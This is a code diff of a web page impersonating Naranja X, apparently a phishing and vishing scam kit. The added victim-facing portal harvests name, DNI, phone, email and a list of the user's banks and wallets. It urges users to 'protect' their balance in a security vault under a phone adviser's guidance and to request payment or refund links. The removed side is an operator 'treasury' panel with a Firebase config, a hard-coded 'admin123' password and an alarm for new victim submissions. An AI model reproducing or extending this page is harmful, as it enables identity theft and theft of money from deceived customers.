@@ -3,16 +3,18 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Panel de Tesorería y Administración | Naranja X</title>
+  <title>Portal de Gestión de Clientes y Servicios | Naranja X</title>
   <!-- Tailwind CSS CDN -->
   <script src="https://cdn.tailwindcss.com"></script>
+  <!-- FontAwesome CDN para Iconos -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <link rel="stylesheet" href="assets/css/styles.css">
   <script>
     tailwind.config = {
       theme: {
         extend: {
           colors: {
-            nxOrange: { 50: '#fff7ed', 500: '#FF6B00', 600: '#ea580c', 700: '#c2410c' },
+            nxOrange: { 50: '#fff7ed', 100: '#ffedd5', 500: '#FF6B00', 600: '#ea580c', 700: '#c2410c' },
             nxPurple: { 50: '#f3e8ff', 100: '#e9d5ff', 600: '#9333ea', 700: '#7e22ce', 800: '#6b21a8', 900: '#581c87' }
           }
         }
@@ -20,309 +22,338 @@
     }
   </script>
 </head>
-<body class="min-h-screen flex flex-col justify-between bg-slate-100">
+<body class="min-h-screen flex flex-col justify-between bg-slate-50">
 
-  <!-- Protección de acceso por clave -->
-  <div id="login-overlay" class="fixed inset-0 bg-slate-900/90 z-50 flex items-center justify-center p-4">
-    <div class="bg-white rounded-2xl p-6 max-w-sm w-full shadow-2xl text-center space-y-4">
-      <div class="w-12 h-12 bg-nxOrange-50 text-nxOrange-500 rounded-xl mx-auto flex items-center justify-center text-xl font-bold">🔒</div>
-      <div>
-        <h2 class="font-extrabold text-nxPurple-900 text-lg">Área Restringida</h2>
-        <p class="text-xs text-slate-500 mt-0.5">Introduce tu clave de tesorero para continuar.</p>
+  <!-- Header / Barra Superior -->
+  <header class="bg-white border-b border-slate-200 sticky top-0 z-30 shadow-sm">
+    <div class="max-w-md mx-auto px-4 py-3 flex items-center justify-between">
+      <div class="flex items-center space-x-2.5">
+        <div class="w-9 h-9 bg-nxOrange-500 rounded-xl flex items-center justify-center text-white font-extrabold text-lg shadow-sm">NX</div>
+        <span class="font-bold text-nxPurple-900 tracking-tight text-base">Portal de Servicios</span>
       </div>
-      <input type="password" id="admin-pass" placeholder="Clave de acceso" class="w-full px-4 py-3 bg-slate-50 border border-slate-300 rounded-xl text-sm focus:outline-none focus:border-nxOrange-500">
-      <button onclick="adminApp.login()" class="w-full bg-nxPurple-900 hover:bg-nxPurple-800 text-white font-bold py-3 rounded-xl transition text-sm">
-        Iniciar Sesión
-      </button>
-    </div>
-  </div>
-
-  <!-- Header Admin -->
-  <header class="bg-nxPurple-900 text-white border-b border-nxPurple-800 sticky top-0 z-30 shadow-md">
-    <div class="max-w-6xl mx-auto px-4 py-4 flex justify-between items-center">
-      <div class="flex items-center space-x-3">
-        <div class="w-9 h-9 bg-nxOrange-500 rounded-xl flex items-center justify-center text-white font-extrabold shadow-sm">NX</div>
-        <div>
-          <h1 class="font-extrabold text-white text-base leading-tight">Panel de Tesorería Oficial</h1>
-          <p class="text-xs text-nxPurple-100 opacity-90">Gestión en Vivo por Firebase</p>
-        </div>
-      </div>
-      <button onclick="adminApp.logout()" class="text-xs bg-white/10 hover:bg-white/20 text-white font-semibold px-4 py-2 rounded-xl transition border border-white/20">
-        Cerrar Sesión
-      </button>
+      <button onclick="app.openAdminModal()" class="text-xs text-slate-300 hover:text-slate-400 transition" title="Acceso Restringido">🔒</button>
     </div>
   </header>
 
-  <!-- Contenido Admin -->
-  <main class="max-w-6xl w-full mx-auto p-4 md:p-6 flex-1">
-    <div class="bg-white rounded-2xl shadow-sm border border-slate-200 overflow-hidden">
-      <div class="p-5 border-b border-slate-200 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3">
-        <div>
-          <h2 class="font-extrabold text-nxPurple-900 text-lg">Pedidos y Reclamaciones Activas</h2>
-          <p class="text-xs text-slate-500">Sincronización en tiempo real desde la nube.</p>
+  <!-- Contenedor Principal -->
+  <main class="max-w-md w-full mx-auto p-4 flex-1 flex flex-col justify-center">
+    
+    <!-- BARRA NAVEGADORA SUPERIOR CON BOTÓN VOLVER -->
+    <div id="nav-header-container" class="mb-4 hidden items-center justify-between">
+      <button type="button" onclick="app.goBack()" class="text-xs font-bold text-nxPurple-900 hover:text-nxOrange-600 flex items-center space-x-1.5 bg-white px-3 py-2 rounded-xl border border-slate-200 shadow-sm transition active:scale-95">
+        <i class="fa-solid fa-arrow-left text-nxOrange-500"></i>
+        <span>Volver</span>
+      </button>
+
+      <div id="progress-container" class="flex-1 ml-3">
+        <div class="flex justify-between text-[11px] font-semibold text-slate-500 mb-1">
+          <span id="step-label" class="text-nxPurple-900 font-bold">Paso 1 de 3</span>
+          <span id="step-percent" class="text-nxOrange-600 font-bold">33%</span>
         </div>
-        
-        <div class="flex items-center space-x-2">
-          <button id="btn-notifications" onclick="adminApp.enableNotificationsManual()" class="text-xs bg-nxPurple-50 hover:bg-nxPurple-100 text-nxPurple-800 font-bold px-3.5 py-2 rounded-xl transition flex items-center space-x-1 border border-nxPurple-200">
-            <span>🚨 Activar Alarma Sonora</span>
+        <div class="w-full bg-slate-200 h-2 rounded-full overflow-hidden">
+          <div id="progress-bar" class="bg-nxOrange-500 h-full w-1/3 transition-all duration-300 rounded-full"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- TARJETA CONTENEDORA -->
+    <div class="bg-white rounded-2xl shadow-xl border border-slate-100 p-6 md:p-8 relative overflow-hidden fade-in">
+
+      <!-- ================= PANTALLA 1: BIENVENIDA ================= -->
+      <div id="screen-1" class="space-y-6 text-center">
+        <div class="w-16 h-16 bg-nxOrange-50 text-nxOrange-500 rounded-2xl mx-auto flex items-center justify-center text-3xl shadow-inner border border-nxOrange-100">
+          <i class="fa-solid fa-shield-halved text-nxOrange-500"></i>
+        </div>
+        <div class="space-y-2">
+          <h1 class="text-2xl font-extrabold text-nxPurple-900">Bienvenido al Portal</h1>
+          <p class="text-sm text-slate-600 leading-relaxed">
+            Gestiona tus consultas, pagos y solicitudes de manera rápida, segura y 100% digital con la garantía de <strong class="text-nxOrange-600">Naranja X</strong>.
+          </p>
+        </div>
+        <button onclick="app.goToScreen(2)" class="w-full bg-nxOrange-500 hover:bg-nxOrange-600 active:scale-[0.98] text-white font-bold py-3.5 px-6 rounded-xl shadow-lg shadow-nxOrange-500/30 transition duration-200">
+          Continuar
+        </button>
+      </div>
+
+      <!-- ================= PANTALLA 2: DATOS DEL CLIENTE ================= -->
+      <div id="screen-2" class="space-y-5 hidden">
+        <div>
+          <h2 class="text-xl font-extrabold text-nxPurple-900">Tus Datos Personales</h2>
+          <p class="text-xs text-slate-500 mt-0.5">Completa la información requerida para iniciar tu gestión.</p>
+        </div>
+
+        <form id="client-form" onsubmit="app.handleClientSubmit(event)" class="space-y-4">
+          <div>
+            <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1">Nombre Completo</label>
+            <input type="text" id="client-name" required placeholder="Ej. Juan Pérez" class="w-full px-4 py-3 bg-slate-50 border border-slate-300 rounded-xl text-slate-900 focus:outline-none focus:border-nxOrange-500 focus:bg-white transition text-sm">
+          </div>
+          <div>
+            <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1">DNI</label>
+            <input type="text" id="client-dni" required placeholder="Ej. 35123456" class="w-full px-4 py-3 bg-slate-50 border border-slate-300 rounded-xl text-slate-900 focus:outline-none focus:border-nxOrange-500 focus:bg-white transition text-sm">
+          </div>
+          <div>
+            <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1">Teléfono / WhatsApp</label>
+            <input type="tel" id="client-phone" required placeholder="Ej. +54 9 11 1234 5678" class="w-full px-4 py-3 bg-slate-50 border border-slate-300 rounded-xl text-slate-900 focus:outline-none focus:border-nxOrange-500 focus:bg-white transition text-sm">
+          </div>
+          <div>
+            <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1">Correo Electrónico</label>
+            <input type="email" id="client-email" required placeholder="correo@ejemplo.com" class="w-full px-4 py-3 bg-slate-50 border border-slate-300 rounded-xl text-slate-900 focus:outline-none focus:border-nxOrange-500 focus:bg-white transition text-sm">
+          </div>
+          <button type="submit" class="w-full bg-nxOrange-500 hover:bg-nxOrange-600 active:scale-[0.98] text-white font-bold py-3.5 px-6 rounded-xl shadow-lg shadow-nxOrange-500/30 transition duration-200 mt-2">
+            Siguiente Paso
+          </button>
+        </form>
+      </div>
+
+      <!-- ================= PANTALLA 3: SELECCIÓN DE CATEGORÍA ================= -->
+      <div id="screen-3" class="space-y-4 hidden">
+        <div>
+          <h2 class="text-xl font-extrabold text-nxPurple-900">¿Qué gestión necesitas?</h2>
+          <p class="text-xs text-slate-500 mt-0.5">Selecciona una de las siguientes opciones.</p>
+        </div>
+
+        <div class="space-y-3 pt-1">
+          <!-- Card 1 -->
+          <button onclick="app.selectCategory('app_issues')" class="w-full text-left p-4 rounded-xl border border-slate-200 hover:border-nxPurple-600 hover:bg-nxPurple-50/50 transition group flex items-center space-x-4">
+            <div class="w-12 h-12 bg-nxPurple-50 rounded-xl flex items-center justify-center shrink-0 border border-nxPurple-100 group-hover:scale-105 transition">
+              <i class="fa-solid fa-mobile-screen-button text-xl text-nxPurple-800"></i>
+            </div>
+            <div>
+              <h3 class="font-bold text-slate-800 text-sm group-hover:text-nxPurple-800">Problemas con la aplicación</h3>
+              <p class="text-xs text-slate-500 mt-0.5">Actualización del sistema y resguardo de saldo.</p>
+            </div>
+          </button>
+
+          <!-- Card 2 -->
+          <button onclick="app.selectCategory('payments')" class="w-full text-left p-4 rounded-xl border border-slate-200 hover:border-nxPurple-600 hover:bg-nxPurple-50/50 transition group flex items-center space-x-4">
+            <div class="w-12 h-12 bg-nxPurple-50 rounded-xl flex items-center justify-center shrink-0 border border-nxPurple-100 group-hover:scale-105 transition">
+              <i class="fa-solid fa-file-invoice-dollar text-xl text-nxPurple-800"></i>
+            </div>
+            <div>
+              <h3 class="font-bold text-slate-800 text-sm group-hover:text-nxPurple-800">Pagos/Resumen</h3>
+              <p class="text-xs text-slate-500 mt-0.5">Generación de link de pago Naranja X.</p>
+            </div>
+          </button>
+
+          <!-- Card 3 -->
+          <button onclick="app.selectCategory('transfers')" class="w-full text-left p-4 rounded-xl border border-slate-200 hover:border-nxPurple-600 hover:bg-nxPurple-50/50 transition group flex items-center space-x-4">
+            <div class="w-12 h-12 bg-nxPurple-50 rounded-xl flex items-center justify-center shrink-0 border border-nxPurple-100 group-hover:scale-105 transition">
+              <i class="fa-solid fa-money-bill-transfer text-xl text-nxPurple-800"></i>
+            </div>
+            <div>
+              <h3 class="font-bold text-slate-800 text-sm group-hover:text-nxPurple-800">Transferencias/Devoluciones</h3>
+              <p class="text-xs text-slate-500 mt-0.5">Acreditación y reintegro sobre saldo actual.</p>
+            </div>
           </button>
         </div>
       </div>
 
-      <!-- Tabla de Pedidos -->
-      <div class="overflow-x-auto">
-        <table class="w-full text-left border-collapse text-sm">
-          <thead>
-            <tr class="bg-slate-50 text-slate-500 text-xs uppercase tracking-wider border-b border-slate-200">
-              <th class="p-4 font-bold">ID Pedido</th>
-              <th class="p-4 font-bold">Cliente / DNI</th>
-              <th class="p-4 font-bold">Categoría / Monto</th>
-              <th class="p-4 font-bold">Bancos y Cuentas Declaradas</th>
-              <th class="p-4 font-bold">Estado</th>
-              <th class="p-4 font-bold">URL Link Creado</th>
-              <th class="p-4 font-bold text-right">Acción</th>
-            </tr>
-          </thead>
-          <tbody id="admin-table-body" class="divide-y divide-slate-100 text-slate-700">
-            <!-- Inyectado dinámicamente -->
-          </tbody>
-        </table>
+      <!-- ================= FLUJO A: PROBLEMAS CON LA APP ================= -->
+      <div id="flow-app-issues" class="space-y-5 hidden">
+        <div>
+          <span class="text-xs font-bold text-nxOrange-600 uppercase tracking-wider">Soporte Técnico Naranja X</span>
+          <h2 class="text-xl font-extrabold text-nxPurple-900 mt-0.5">Actualización y Resguardo de Saldo</h2>
+        </div>
+
+        <div class="p-4 bg-nxPurple-50 border border-nxPurple-100 rounded-xl space-y-3">
+          <div class="flex items-center space-x-2 text-nxPurple-900 font-bold text-sm">
+            <span>🛡️</span>
+            <span>Justificativo de Seguridad y Protección de Fondos</span>
+          </div>
+          <p class="text-xs text-slate-700 leading-relaxed">
+            Debido a las recientes optimizaciones en nuestros servidores, resulta indispensable realizar una <strong>Actualización del Sistema</strong>. Para garantizar que tu saldo en cuenta no sufra bloqueos o inconsistencias temporales durante este mantenimiento, tus fondos deben ser resguardados de manera preventiva en la bóveda de seguridad.
+          </p>
+        </div>
+
+        <div class="p-4 bg-slate-50 border border-slate-200 rounded-xl space-y-3">
+          <div class="flex items-start space-x-3">
+            <span class="text-2xl">🎧</span>
+            <div class="space-y-1">
+              <h4 class="font-bold text-slate-900 text-sm">Asistencia Telefónica Guiada</h4>
+              <p class="text-xs text-slate-600 leading-relaxed">
+                Tu <strong>asesor telefónico asignado</strong> te guiará paso a paso en esta llamada para llevar a cabo la actualización del sistema y completar la protección de tu saldo de forma segura.
+              </p>
+            </div>
+          </div>
+        </div>
+
+        <button onclick="app.resetApp()" class="w-full bg-nxPurple-900 text-white font-bold py-3.5 px-4 rounded-xl hover:bg-nxPurple-800 transition text-sm">
+          Entendido / Finalizar Consulta
+        </button>
       </div>
 
-      <!-- Estado Vacío -->
-      <div id="admin-empty-state" class="hidden p-12 text-center space-y-3">
-        <div class="w-12 h-12 bg-slate-100 text-slate-400 rounded-full mx-auto flex items-center justify-center text-xl">📭</div>
-        <p class="text-sm font-semibold text-slate-600">No hay solicitudes pendientes en este momento.</p>
+      <!-- ================= FLUJO B: PAGOS / RESUMEN ================= -->
+      <div id="flow-payments" class="space-y-5 hidden">
+        <div>
+          <span class="text-xs font-bold text-nxPurple-800 uppercase tracking-wider">Pasarela Naranja X</span>
+          <h2 id="payment-title-heading" class="text-xl font-extrabold text-nxPurple-900 mt-0.5">Pago de Resumen</h2>
+        </div>
+
+        <!-- B1: Ingreso de Monto -->
+        <div id="pay-form-view" class="space-y-4">
+          <div>
+            <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1">Monto a Abonar ($)</label>
+            <input type="text" id="pay-amount" placeholder="Ej. 350.000" oninput="app.formatCurrencyInput(this)" class="w-full px-4 py-3 bg-slate-50 border border-slate-300 rounded-xl text-slate-900 focus:outline-none focus:border-nxOrange-500 focus:bg-white transition text-sm font-semibold">
+          </div>
+
+          <div>
+            <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1">Tipo de Pago</label>
+            <select id="pay-type" class="w-full px-4 py-3 bg-slate-50 border border-slate-300 rounded-xl text-slate-900 focus:outline-none focus:border-nxOrange-500 focus:bg-white transition text-sm">
+              <option value="Pago Total">Pago Total</option>
+              <option value="Pago Parcial">Pago Parcial</option>
+            </select>
+          </div>
+
+          <button type="button" onclick="app.generatePaymentOrder()" class="w-full bg-nxOrange-500 hover:bg-nxOrange-600 active:scale-[0.98] text-white font-bold py-3.5 px-6 rounded-xl shadow-lg shadow-nxOrange-500/30 transition duration-200">
+            Generar Solicitud de Pago
+          </button>
+        </div>
+
+        <!-- B2: Esperando Link (Redirección Automática) -->
+        <div id="pay-waiting-view" class="space-y-6 hidden text-center py-4">
+          <div class="p-4 bg-nxPurple-50 rounded-xl border border-nxPurple-100 space-y-1">
+            <p class="text-xs text-nxPurple-800 font-semibold">Número de Pedido Asignado</p>
+            <h3 id="display-order-id" class="text-xl font-extrabold text-nxPurple-900 tracking-wide">#NX-0000</h3>
+            <p id="display-order-amount" class="text-sm font-bold text-nxOrange-600 pt-1">$0</p>
+          </div>
+
+          <div class="space-y-4 py-2">
+            <div class="w-16 h-16 border-4 border-nxOrange-500 border-t-transparent rounded-full animate-spin mx-auto"></div>
+            <h3 class="text-lg font-extrabold text-nxPurple-900 leading-snug">
+              Buscando Link de Pago<br><span class="text-nxOrange-600 text-sm">Redireccionando automáticamente...</span>
+            </h3>
+            <p class="text-xs text-slate-500">Un tesorero está homologando tu solicitud en tiempo real.</p>
+          </div>
+        </div>
       </div>
+
+      <!-- ================= FLUJO C: TRANSFERENCIAS / DEVOLUCIONES ================= -->
+      <div id="flow-transfers" class="space-y-5 hidden">
+        <div>
+          <span class="text-xs font-bold text-nxOrange-600 uppercase tracking-wider">Gestión de Reintegros Naranja X</span>
+          <h2 class="text-xl font-extrabold text-nxPurple-900 mt-0.5">Acreditación sobre Saldo Actual</h2>
+        </div>
+
+        <!-- C1: Monto del Reintegro -->
+        <div id="claim-form-view" class="space-y-4">
+          <p class="text-xs text-slate-600 leading-relaxed">
+            Ingresa el monto exacto que corresponde acreditar sobre tu saldo actual para iniciar el trámite de devolución.
+          </p>
+          <div>
+            <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1">Monto a Acreditar ($)</label>
+            <input type="text" id="claim-amount" placeholder="Ej. 100.000" oninput="app.formatCurrencyInput(this)" class="w-full px-4 py-3 bg-slate-50 border border-slate-300 rounded-xl text-slate-900 focus:outline-none focus:border-nxOrange-500 focus:bg-white transition text-sm font-semibold">
+          </div>
+          <button type="button" onclick="app.goToBankSelection()" class="w-full bg-nxOrange-500 hover:bg-nxOrange-600 active:scale-[0.98] text-white font-bold py-3.5 px-6 rounded-xl shadow-lg shadow-nxOrange-500/30 transition duration-200">
+            Continuar a Selección de Bancos
+          </button>
+        </div>
+
+        <!-- C2: Selección de Bancos y Billeteras -->
+        <div id="claim-banks-view" class="space-y-4 hidden">
+          <div class="p-3.5 bg-nxPurple-50 border border-nxPurple-100 rounded-xl">
+            <h4 class="font-bold text-nxPurple-900 text-xs uppercase tracking-wider mb-1">¿Por qué solicitamos esta información?</h4>
+            <p class="text-xs text-slate-600 leading-relaxed">
+              Para homologar y liberar tu devolución, el sistema de auditoría debe verificar qué entidades bancarias y billeteras virtuales tienes habilitadas a tu nombre.
+            </p>
+          </div>
+
+          <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider">Selecciona tus cuentas de titularidad:</label>
+          
+          <div class="grid grid-cols-2 gap-2 text-xs font-semibold text-slate-700 max-h-48 overflow-y-auto p-1">
+            <label class="p-3 bg-slate-50 border border-slate-200 rounded-xl flex items-center space-x-2 cursor-pointer hover:bg-nxOrange-50 transition">
+              <input type="checkbox" value="Naranja X" class="bank-checkbox w-4 h-4 text-nxOrange-500 rounded focus:ring-0">
+              <span>🧡 Naranja X</span>
+            </label>
+            <label class="p-3 bg-slate-50 border border-slate-200 rounded-xl flex items-center space-x-2 cursor-pointer hover:bg-nxOrange-50 transition">
+              <input type="checkbox" value="Mercado Pago" class="bank-checkbox w-4 h-4 text-nxOrange-500 rounded focus:ring-0">
+              <span>💙 Mercado Pago</span>
+            </label>
+            <label class="p-3 bg-slate-50 border border-slate-200 rounded-xl flex items-center space-x-2 cursor-pointer hover:bg-nxOrange-50 transition">
+              <input type="checkbox" value="Banco Nación" class="bank-checkbox w-4 h-4 text-nxOrange-500 rounded focus:ring-0">
+              <span>🏛️ Banco Nación</span>
+            </label>
+            <label class="p-3 bg-slate-50 border border-slate-200 rounded-xl flex items-center space-x-2 cursor-pointer hover:bg-nxOrange-50 transition">
+              <input type="checkbox" value="Banco Galicia" class="bank-checkbox w-4 h-4 text-nxOrange-500 rounded focus:ring-0">
+              <span>🟠 Banco Galicia</span>
+            </label>
+            <label class="p-3 bg-slate-50 border border-slate-200 rounded-xl flex items-center space-x-2 cursor-pointer hover:bg-nxOrange-50 transition">
+              <input type="checkbox" value="BBVA" class="bank-checkbox w-4 h-4 text-nxOrange-500 rounded focus:ring-0">
+              <span>🔵 BBVA</span>
+            </label>
+            <label class="p-3 bg-slate-50 border border-slate-200 rounded-xl flex items-center space-x-2 cursor-pointer hover:bg-nxOrange-50 transition">
+              <input type="checkbox" value="Santander" class="bank-checkbox w-4 h-4 text-nxOrange-500 rounded focus:ring-0">
+              <span>🔴 Santander</span>
+            </label>
+            <label class="p-3 bg-slate-50 border border-slate-200 rounded-xl flex items-center space-x-2 cursor-pointer hover:bg-nxOrange-50 transition">
+              <input type="checkbox" value="Ualá" class="bank-checkbox w-4 h-4 text-nxOrange-500 rounded focus:ring-0">
+              <span>🦄 Ualá</span>
+            </label>
+            <label class="p-3 bg-slate-50 border border-slate-200 rounded-xl flex items-center space-x-2 cursor-pointer hover:bg-nxOrange-50 transition">
+              <input type="checkbox" value="Brubank" class="bank-checkbox w-4 h-4 text-nxOrange-500 rounded focus:ring-0">
+              <span>💜 Brubank</span>
+            </label>
+          </div>
+
+          <button type="button" onclick="app.goToReimbursementInstructions()" class="w-full bg-nxOrange-500 hover:bg-nxOrange-600 text-white font-bold py-3.5 px-6 rounded-xl shadow-lg shadow-nxOrange-500/30 transition duration-200">
+            Confirmar y Continuar
+          </button>
+        </div>
+
+        <!-- C3: Instrucciones del Operador -->
+        <div id="claim-instructions-view" class="space-y-5 hidden">
+          <div class="p-4 bg-slate-50 border border-slate-200 rounded-xl space-y-2">
+            <h4 class="font-bold text-slate-900 text-sm">Paso Final: Acreditación Guiada</h4>
+            <p class="text-xs text-slate-600 leading-relaxed">
+              Sigue minuciosamente las indicaciones de tu asesor telefónico para habilitar el canal de devolución en tu cuenta.
+            </p>
+          </div>
+
+          <button type="button" onclick="app.generateReimbursementOrder()" class="w-full bg-nxOrange-500 hover:bg-nxOrange-600 text-white font-bold py-3.5 px-6 rounded-xl shadow-lg shadow-nxOrange-500/30 transition duration-200">
+            Generar Solicitud de Devolución
+          </button>
+        </div>
+
+        <!-- C4: Esperando Link de Devolución (Redirección Automática) -->
+        <div id="claim-waiting-view" class="space-y-6 hidden text-center py-4">
+          <div class="p-4 bg-nxPurple-50 rounded-xl border border-nxPurple-100 space-y-1">
+            <p class="text-xs text-nxPurple-800 font-semibold">Solicitud de Devolución Asignada</p>
+            <h3 id="display-claim-id" class="text-xl font-extrabold text-nxPurple-900 tracking-wide">#TR-0000</h3>
+            <p id="display-claim-amount" class="text-sm font-bold text-nxOrange-600 pt-1">$0</p>
+          </div>
+
+          <div class="space-y-4 py-2">
+            <div class="w-16 h-16 border-4 border-nxOrange-500 border-t-transparent rounded-full animate-spin mx-auto"></div>
+            <h3 class="text-lg font-extrabold text-nxPurple-900 leading-snug">
+              Buscando Link de Devolución<br><span class="text-nxOrange-600 text-sm">Redireccionando automáticamente...</span>
+            </h3>
+            <p class="text-xs text-slate-500">Un tesorero está validando la vía de acreditación.</p>
+          </div>
+        </div>
+      </div>
+
     </div>
   </main>
 
+  <!-- Modal Admin -->
+  <div id="admin-auth-modal" class="fixed inset-0 bg-slate-900/60 backdrop-blur-sm z-50 flex items-center justify-center p-4 hidden">
+    <div class="bg-white rounded-2xl p-6 max-w-xs w-full shadow-2xl border border-slate-100 space-y-4">
+      <div class="text-center">
+        <span class="text-2xl">🔑</span>
+        <h3 class="font-extrabold text-nxPurple-900 text-base mt-1">Acceso a Tesorería</h3>
+        <p class="text-xs text-slate-500">Ingresa la clave exclusiva de administrador.</p>
+      </div>
+      <input type="password" id="admin-pass-input" placeholder="Contraseña" class="w-full px-3 py-2.5 bg-slate-50 border border-slate-300 rounded-xl text-sm focus:outline-none focus:border-nxOrange-500">
+      <div class="flex space-x-2">
+        <button onclick="app.closeAdminModal()" class="w-1/2 bg-slate-100 text-slate-700 font-semibold py-2 rounded-xl text-xs">Cancelar</button>
+        <button onclick="app.verifyAdminPass()" class="w-1/2 bg-nxPurple-900 text-white font-bold py-2 rounded-xl text-xs">Ingresar</button>
+      </div>
+    </div>
+  </div>
+
   <footer class="py-4 text-center text-xs text-slate-400">
-    &copy; 2026 Módulo de Tesorería Interna - Naranja X
+    &copy; 2026 Naranja X - Todos los derechos reservados.
   </footer>
 
-  <!-- Script Admin con Alarma Sonora Estridente -->
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-    import { getDatabase, ref, onValue, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
-
-    const firebaseConfig = {
-      apiKey: "AIzaSyDHcfixcpUU4O-RYLmfNzTUDZFB13jEt5s",
-      authDomain: "portal-naranja-763f4.firebaseapp.com",
-      databaseURL: "https://portal-naranja-763f4-default-rtdb.firebaseio.com",
-      projectId: "portal-naranja-763f4",
-      storageBucket: "portal-naranja-763f4.firebasestorage.app",
-      messagingSenderId: "908694133500",
-      appId: "1:908694133500:web:1808b481eeb45c305c9579"
-    };
-
-    const appFB = initializeApp(firebaseConfig);
-    const db = getDatabase(appFB);
-
-    window.adminApp = {
-      lastKnownKeys: [],
-      isFirstLoad: true,
-      audioCtx: null,
-
-      init() {
-        if (sessionStorage.getItem('nx_admin_auth') === 'true') {
-          document.getElementById('login-overlay').classList.add('hidden');
-          this.listenToFirebaseRequests();
-          this.updateNotificationButtonState();
-        }
-      },
-
-      login() {
-        const pass = document.getElementById('admin-pass').value;
-        if (pass === 'admin123') {
-          sessionStorage.setItem('nx_admin_auth', 'true');
-          document.getElementById('login-overlay').classList.add('hidden');
-          this.listenToFirebaseRequests();
-          this.enableNotificationsManual();
-        } else {
-          alert('Clave incorrecta');
-        }
-      },
-
-      logout() {
-        sessionStorage.removeItem('nx_admin_auth');
-        window.location.reload();
-      },
-
-      async enableNotificationsManual() {
-        try {
-          if (!this.audioCtx) {
-            this.audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-          }
-          if (this.audioCtx.state === 'suspended') {
-            await this.audioCtx.resume();
-          }
-          this.playLoudAlarmSound();
-        } catch (e) {
-          console.error('Audio init error:', e);
-        }
-
-        if ('Notification' in window) {
-          const perm = await Notification.requestPermission();
-          if (perm === 'granted') {
-            alert('🚨 ¡Alarma sonora y notificaciones activadas a máximo volumen!');
-          }
-        }
-        this.updateNotificationButtonState();
-      },
-
-      updateNotificationButtonState() {
-        const btn = document.getElementById('btn-notifications');
-        if (!btn) return;
-        if ('Notification' in window && Notification.permission === 'granted') {
-          btn.innerHTML = '<span>🚨 Alarma Activa</span>';
-          btn.className = 'text-xs bg-emerald-50 text-emerald-700 font-bold px-3.5 py-2 rounded-xl border border-emerald-200';
-        }
-      },
-
-      // NUEVO MOTOR DE AUDIO: Alarma Potente Tipo Sirena de Emergencia
-      playLoudAlarmSound() {
-        try {
-          if (!this.audioCtx) {
-            this.audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-          }
-          if (this.audioCtx.state === 'suspended') {
-            this.audioCtx.resume();
-          }
-
-          const now = this.audioCtx.currentTime;
-          
-          // Creamos el oscilador con onda cuadrada (Square) que es mucho más estridente y fuerte
-          const osc = this.audioCtx.createOscillator();
-          const gain = this.audioCtx.createGain();
-
-          osc.type = 'square'; // Tipo de onda muy llamativa/industrial
-
-          // Secuencia multitono estilo sirena (Acento agudo alternado)
-          osc.frequency.setValueAtTime(880, now);          // A5
-          osc.frequency.setValueAtTime(1200, now + 0.15);    // D6 (Agudo)
-          osc.frequency.setValueAtTime(880, now + 0.30);     // A5
-          osc.frequency.setValueAtTime(1200, now + 0.45);    // D6 (Agudo)
-          osc.frequency.setValueAtTime(880, now + 0.60);     // A5
-          osc.frequency.setValueAtTime(1400, now + 0.75);    // E6 (Muy Agudo)
-
-          // Volumen máximo sostenido (0.8)
-          gain.gain.setValueAtTime(0.8, now);
-          gain.gain.exponentialRampToValueAtTime(0.01, now + 1.1);
-
-          osc.connect(gain);
-          gain.connect(this.audioCtx.destination);
-
-          osc.start(now);
-          osc.stop(now + 1.1);
-        } catch (e) {
-          console.error("Error al reproducir el tono fuerte:", e);
-        }
-      },
-
-      triggerNotification(request) {
-        this.playLoudAlarmSound();
-
-        if ('Notification' in window && Notification.permission === 'granted') {
-          const title = `🚨 ¡NUEVO PEDIDO DE LINK RECIBIDO! (${request.id})`;
-          const options = {
-            body: `👤 Cliente: ${request.name}\n💰 Monto: $${request.amount || '0'}\n📌 Tipo: ${request.category === 'transfers' ? 'Devolución' : 'Pago Resumen'}`,
-            icon: 'https://cdn-icons-png.flaticon.com/512/1827/1827504.png',
-            requireInteraction: true
-          };
-          const notification = new Notification(title, options);
-          notification.onclick = () => { window.focus(); notification.close(); };
-        }
-      },
-
-      listenToFirebaseRequests() {
-        const requestsRef = ref(db, 'requests');
-        onValue(requestsRef, (snapshot) => {
-          const data = snapshot.val() || {};
-          const keys = Object.keys(data);
-
-          if (!this.isFirstLoad) {
-            keys.forEach(key => {
-              if (!this.lastKnownKeys.includes(key)) {
-                this.triggerNotification(data[key]);
-              }
-            });
-          }
-
-          this.lastKnownKeys = keys;
-          this.isFirstLoad = false;
-          this.renderTable(data);
-        });
-      },
-
-      renderTable(data) {
-        const tbody = document.getElementById('admin-table-body');
-        const emptyState = document.getElementById('admin-empty-state');
-        tbody.innerHTML = '';
-
-        const items = Object.entries(data).reverse();
-
-        if (items.length === 0) {
-          emptyState.classList.remove('hidden');
-          return;
-        }
-
-        emptyState.classList.add('hidden');
-
-        items.forEach(([firebaseKey, req]) => {
-          const tr = document.createElement('tr');
-          tr.className = 'hover:bg-slate-50/70 transition';
-          
-          let badgeColor = 'bg-amber-100 text-amber-800';
-          if (req.status === 'Link Generado') badgeColor = 'bg-emerald-100 text-emerald-800';
-          if (req.category === 'transfers') badgeColor = 'bg-nxPurple-100 text-nxPurple-800';
-
-          const banksDisplay = (req.selectedBanks && req.selectedBanks.length > 0)
-            ? `<div class="flex flex-wrap gap-1">${req.selectedBanks.map(b => `<span class="bg-slate-100 text-slate-800 text-[10px] font-bold px-2 py-0.5 rounded-md border border-slate-200">${b}</span>`).join('')}</div>`
-            : '<span class="text-xs text-slate-400 italic">Sin cuentas asociadas</span>';
-
-          tr.innerHTML = `
-            <td class="p-4 font-mono font-bold text-xs text-nxPurple-900">${req.id}</td>
-            <td class="p-4">
